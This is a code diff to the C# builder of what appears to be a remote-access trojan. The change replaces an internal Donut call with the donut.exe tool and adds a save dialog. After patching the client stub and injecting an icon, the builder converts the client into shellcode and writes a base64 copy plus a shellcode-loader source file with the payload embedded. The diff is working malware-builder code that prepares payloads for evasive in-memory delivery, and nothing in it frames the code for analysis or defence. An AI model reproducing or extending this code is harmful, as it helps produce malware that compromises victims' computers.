@@ -14,7 +14,6 @@ using dnlib.DotNet.Emit;
 using System.Threading.Tasks;
 using System.Diagnostics;
 using Toolbelt.Drawing;
-using Server.Helper.Donut;
 
 namespace Server.Forms
 {
@@ -516,7 +515,7 @@ namespace Server.Forms
             {
                 using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
                 {
-                    string Temppath = Path.Combine(Application.StartupPath, @"Stub\tempClient.exe"); ;
+                    string Temppath = Path.Combine(Application.StartupPath, @"Stub\tempClient.exe");
                     if (File.Exists(Temppath)) 
                     {
                         File.Delete(Temppath);
@@ -536,8 +535,37 @@ namespace Server.Forms
                     {
                         IconInjector.InjectIcon(Temppath, txtIcon.Text);
                     }
-                    Donut.Creat(Temppath);
+                    string savepath = "";
+                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
+                    {
+                        saveFileDialog1.Filter = ".bin (*.bin)|*.bin";
+                        saveFileDialog1.InitialDirectory = Application.StartupPath;
+                        saveFileDialog1.OverwritePrompt = false;
+                        saveFileDialog1.FileName = "Client";
+                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
+                        {
+                            savepath = saveFileDialog1.FileName;
+                        }
+                    }
+                    string Donutpath = Path.Combine(Application.StartupPath, @"Plugins\donut.exe");
+                    if (!File.Exists(Donutpath)) 
+                    {
+                        File.WriteAllBytes(Donutpath,Properties.Resources.donut);
+                    }
+                    Process Process = new Process();
+                    Process.StartInfo.FileName = Donutpath;
+                    Process.StartInfo.CreateNoWindow = true;
+                    Process.StartInfo.Arguments = "-f " + Temppath + " -o " + savepath;
+                    Process.Start();
+                    Process.WaitForExit();
+                    Process.Close();
+                    if (File.Exists(savepath))
+                    {
+                        File.WriteAllText(savepath + "loader.cs", Properties.Resources.ShellcodeLoader.Replace("%qwqdanchun%", Convert.ToBase64String(File.ReadAllBytes(savepath))));
+                        File.WriteAllText(savepath + ".b64", Convert.ToBase64String(File.ReadAllBytes(savepath)));
+                    }
                     File.Delete(Temppath);
+                    File.Delete(Donutpath);
                     MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     SaveSettings();
                     this.Close();
